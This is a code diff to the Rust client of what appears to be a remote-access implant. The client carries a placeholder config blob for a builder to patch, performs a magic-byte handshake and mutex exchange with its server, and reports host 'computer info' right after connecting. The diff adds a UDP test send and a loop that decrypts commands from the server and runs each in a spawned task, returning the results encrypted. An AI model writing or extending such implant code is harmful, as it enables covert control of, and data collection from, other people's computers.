@@ -7,22 +7,30 @@
 pub static _CONFIG_DATA: [u8; 4096] = [0xAA; 4096];
 ///////////////////////////////////////////////////////////////////
 
+use std::sync::Arc;
+use std::sync::mpsc::channel;
+
 use aes_gcm::aead::consts::U32;
 use aes_gcm::aead::generic_array::GenericArray;
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Key, Nonce};
-use shared::commands::BaseResponse;
+use shared::commands::{BaseCommand, BaseResponse};
 use shared::crypto::Encryption;
 use shared::types::ClientConfig;
+use smol::channel;
 use smol::{
     //Executor,
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
+    net::UdpSocket,
 };
 
 use crate::commands::computer_info;
+use crate::threading::ActiveCommands;
 
 mod commands;
+mod handler;
+mod threading;
 
 /////////////////////////
 fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
@@ -89,6 +97,27 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
             println!("[v][main] handshake successful; sending mutex");
             stream.write_all(config.mutex.as_slice()).await?;
+
+            // ---- BEGIN UDP TEST ----
+            println!("[*][main] attempting to send UDP packet");
+            let udp_addr = format!("{}:5318", &config.address);
+            match UdpSocket::bind("0.0.0.0:0").await {
+                Ok(socket) => {
+                    if let Err(e) = socket.connect(udp_addr).await {
+                        println!("[x][main] failed to connect UDP socket: {}", e);
+                    } else {
+                        if let Err(e) = socket.send(b"Hello from client!").await {
+                            println!("[x][main] failed to send UDP packet: {}", e);
+                        } else {
+                            println!("[v][main] UDP packet sent successfully");
+                        }
+                    }
+                }
+                Err(e) => {
+                    println!("[x][main] failed to bind UDP socket: {}", e);
+                }
+            }
+            // ---- END UDP TEST ----
         } else {
             println!("[x][main] handshake failed");
             return Err("Failed handshake with server".into()); // drop out
@@ -97,10 +126,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let encryption = Encryption::new(_key);
 
         // send computer info before anything happen
-        if let Ok(res) = computer_info::main().await {
+        if let Ok(res) = computer_info::main() {
             let computer_info_payload = BaseResponse {
                 id: 0,
-                success: true,
                 response: res,
             };
             let _ = send(
@@ -128,7 +156,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     })
 }
 
-async fn send(stream: &mut TcpStream, encryption: &Encryption, buf: Vec<u8>) {
+async fn send(
+    stream: &mut TcpStream,
+    encryption: &Encryption,
+    buf: Vec<u8>,
+) -> Result<(), std::io::Error> {
     if let Ok((nonce, encrypted)) = encryption.encrypt(&buf) {
         let mut payload = Vec::new();
         payload.extend_from_slice(&nonce);
@@ -136,13 +168,39 @@ async fn send(stream: &mut TcpStream, encryption: &Encryption, buf: Vec<u8>) {
 
         let _ = shared::net::write(stream, &payload).await;
         println!("[v][send] wrote payload (size:{}) to server", &buf.len());
+        return Ok(());
     } else {
         println!("[x][send] failed to write to server");
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::BrokenPipe,
+            "Failed to write to server",
+        ));
     }
 }
 
 async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::io::Error> {
     println!("[*][wait] entered loop");
+
+    // Create a channel for sending responses back
+    let (response_tx, response_rx) = channel::unbounded();
+
+    let active = ActiveCommands::new();
+
+    // Wrap encryption in Arc for shared ownership
+    let encryption = Arc::new(encryption);
+
+    // Spawn a task to handle sending responses
+    let mut stream_writer = stream.clone();
+    let encryption_writer = encryption.clone();
+    smol::spawn(async move {
+        while let Ok(response_data) = response_rx.recv().await {
+            if let Err(e) = send(&mut stream_writer, &encryption_writer, response_data).await {
+                println!("[x][wait] failed to send response: {}", e);
+                break;
+            }
+        }
+    })
+    .detach();
 
     loop {
         match shared::net::read(&mut stream).await {
@@ -153,6 +211,16 @@ async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::
                 let buffer = &buf[12..];
                 if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
                     println!("[v][wait] decrypted payload (size:{})", &decrypted.len());
+
+                    let (command, size): (BaseCommand, usize) =
+                        bincode::decode_from_slice(&decrypted, bincode::config::standard())
+                            .unwrap();
+
+                    // Clone the sender for the spawned task
+                    let response_tx = response_tx.clone();
+
+                    // Spawn the command handling in a new task
+                    active.spawn(command, response_tx).await;
                 } else {
                     println!("[x][wait] decryption failed");
                 }
